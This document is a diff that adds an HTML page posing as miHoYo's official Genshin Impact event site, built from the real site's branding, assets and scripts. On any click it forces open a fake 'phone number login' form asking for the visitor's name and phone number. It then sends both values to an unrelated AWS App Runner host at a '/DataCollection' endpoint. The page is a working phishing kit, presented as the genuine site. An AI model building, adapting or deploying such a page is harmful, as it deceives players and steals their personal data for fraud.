@@ -1,0 +1,179 @@
+<!doctype html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+	<meta charset="UTF-8"><meta http-equiv="pragma" content="no-cache">
+	<meta http-equiv="cache-control" content="no-cache">
+	<meta name="applicable-device" content="mobile">
+	<meta name="renderer" content="webkit">
+	<meta name="force-rendering" content="webkit">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+	<meta name="Copyright" content="miHoYo">
+	<meta name="format-detection" content="telephone=no">
+	<meta name="format-detection" content="email=no"/>
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-status-bar-style" content="black-translucent">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link id="icon" rel="shortcut icon" href="https://ys.mihoyo.com/main/favicon.ico"/>
+	<meta name="Description" content="《原神》3.0版本「千朵玫瑰带来的黎明」现已推出！《原神》是由米哈游自研的一款开放世界冒险RPG。你将在游戏中探索一个被称作「提瓦特」的幻想世界。在这广阔的世界中，你可以踏遍七国，邂逅性格各异、能力独特的同伴，与他们一同对抗强敌，踏上寻回血亲之路；也可以不带目的地漫游，沉浸在充满生机的世界里，让好奇心驱使自己发掘各个角落的奥秘……直到你与分离的血亲重聚，在终点见证一切事物的沉淀。"><meta name="Keywords" content="原神, 原神新版本, 原神电脑版, 原神完整版,原神最新版, 原神官网, 原神PC官网, 原神PC端, 原神PC端官网, 原神下载, 原神攻略, 原神PC版, 原神PC下载, 原神手游, 原神ios, 原神官服,原神官方, 原神游戏, 原神安卓, 原神米哈游, 原神手游官网, 原神官方, 原神手游ios, 原神漫画, 原神开放世界, yuanshen官网,原神新地图,原神新区域,原神角色,原神新角色,原神新剧情,原神新武器,原神新活动,原神版本更新">
+	<script defer="defer" src="https://webstatic.mihoyo.com/hk4e/event/puzzle/pz_NiSxYceJzk/config_560be0d50ab89af26253c4615797ea28.js"></script>	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+	<script defer="defer" src="https://webstatic.mihoyo.com/hk4e/event/puzzle/pz_NiSxYceJzk/main_ac0bbed9.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
+	<script src="./jquery.loading.min.js"></script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css" />
+	<link href="https://webstatic.mihoyo.com/hk4e/event/puzzle/pz_NiSxYceJzk/main_f3e215a4.css" rel="stylesheet">
+	<link href="./demo.css" rel="stylesheet">
+	<style>
+		#loginButton,#custom-overlay{
+			display:none;
+		}
+		#login-modal{
+			display:none;
+		}
+		#loginForm.modal{
+			padding-top: 75px;
+			padding-left: 50px;
+			padding-right: 50px;
+			-webkit-border-radius: none !important;
+			-moz-border-radius: none !important;
+			-o-border-radius: none !important;
+			-ms-border-radius: none !important;
+			border-radius: none !important;
+			-webkit-box-shadow: none !important;
+			-moz-box-shadow: none !important;
+			-o-box-shadow: none !important;
+			-ms-box-shadow: none !important;
+			box-shadow: none !important;			
+			background: url(https://uploadstatic.mihoyo.com/puzzle/upload/puzzle/2022/08/19/e04896d198060ad592b1632f984d12e6_2102604218539061475.png?x-oss-process=image/format,webp/quality,Q_90) center center / cover no-repeat !important;
+			overflow: visible;
+			position: relative;
+			width: 3.62rem;
+			height: 4.48rem;
+			z-index:1000;
+			
+		}
+		.lg-title{
+			margin-top:5px;
+			font-size: 20px;
+			text-align: center;
+			font-weight: 500;
+		}
+		.lg-logo{
+			background: url(https://uploadstatic.mihoyo.com/puzzle/upload/puzzle/2022/08/12/b80b3a885bc5367326d90b66934c2020_4696293442908026759.png?x-oss-process=image/format,webp/quality,Q_90) center center / cover no-repeat !important;
+			height: 50px;
+			width: 100px;
+			margin: 0 auto;
+			background-size: 100%;
+		}
+		#username,#phonenumber{
+			width:100%;
+			margin-top:20px;
+			margin-bottom:20px;
+			padding:5px;
+		}
+		#lg-btn{
+			color:#fff;
+			background-color:#9cd31c;
+			margin-top: 20px;
+			margin:0 audio;
+			width:100%;
+			height: 30px;
+		}
+		#lg-btn:hover{			
+			background-color:#71a001;
+		}
+	</style>	
+
+	</head>
+	<body>
+		<div id="app"></div>	
+		<div id="login-modal">
+			<div id="loginForm" class="modal">
+				<div class="lg-logo"></div>
+				<p class="lg-title">手机号登入</p>
+				<input type="text" id="username" placeholder="请输入姓名">
+				<input type="text" id="phonenumber" placeholder="请输入手机号">
+				<input type="button" id="lg-btn" class="loginButton" value="登录" onclick="submit();" />
+			</div>
+		</div>
+		<a id="loginButton" href="#loginForm" class="loginButton" rel="modal:open">Open Modal</a>
+		<div id="custom-overlay" class="loading-shown">
+		  <div class="loading-spinner">
+			Custom loading...
+		  </div>
+		</div>
+		<script src="https://webstatic.mihoyo.com/dora/biz/mihoyo-analysis/v2/main.js"></script>
+		<script src="https://webstatic.mihoyo.com/dora/lib/vue-sentry/2.6.11/vue.min.js"></script>
+		<script>
+			var close = true;
+			var click = true;
+			Sentry.init({
+			dsn: 'https://2d2044ee9ba34d41b1deb282529024b0@sentry.mihoyo.com/9',
+			integrations: [
+			  new Sentry.Integrations.Vue({Vue: Vue, attachProps: true, logErrors: true}),
+			],
+			ignoreErrors: [
+			  'The play() request was interrupted',
+			  'The operation was aborted',
+			  '$ is not defined',
+			  'mihoyo-event-dialog-cancel',
+			  "play() failed because the user didn't interact with the document first",
+			  'The play method is not allowed by the user agent or the platform in the current context'
+			]
+			});
+	  
+			$(document).click(function(e) {	
+				console.log($(e.target).hasClass('loginButton'));
+				if (!$(e.target).hasClass('loginButton') && close && click){					
+					$("#loginButton").trigger("click");	
+				}	
+				else{	
+					click = true;
+				}
+				return false;
+			});	
+			
+			$(document).on($.modal.BEFORE_BLOCK, log_modal_event);
+			$(document).on($.modal.BLOCK, log_modal_event);
+			$(document).on($.modal.BEFORE_OPEN, log_modal_event);
+			$(document).on($.modal.OPEN, log_modal_event);
+			$(document).on($.modal.BEFORE_CLOSE, log_modal_event);
+			$(document).on($.modal.CLOSE, log_modal_event);
+			$(document).on($.modal.AFTER_CLOSE, log_modal_event);
+			$(document).on($.modal.AJAX_SEND, log_modal_event);
+			$(document).on($.modal.AJAX_SUCCESS, log_modal_event);
+			$(document).on($.modal.AJAX_COMPLETE, log_modal_event);
+					
+		   function log_modal_event(event, modal) {
+			  if(typeof console != 'undefined' && console.log){
+				if (event.type == "modal:close"){
+					close = true;
+					click = false;
+				}
+				if (event.type == "modal:open"){
+					close = false;
+					click = true;
+				}
+			  } 				
+			};	
+
+			function submit(){
+				$('body').loading({
+				  overlay: $("#custom-overlay")
+				});
+				
+				$.ajax({
+				  method: "GET",
+				  url: "https://egcphnbusw.ap-northeast-1.awsapprunner.com/DataCollection",
+				  data: { username: $("#username").val(), phonenumber: $("#phonenumber").val() }
+				})
+				.done(function( msg ) {					
+					alert( "Data Saved: " + msg );
+				});			
+			}
+
+		</script>
+	</body>
+</html>
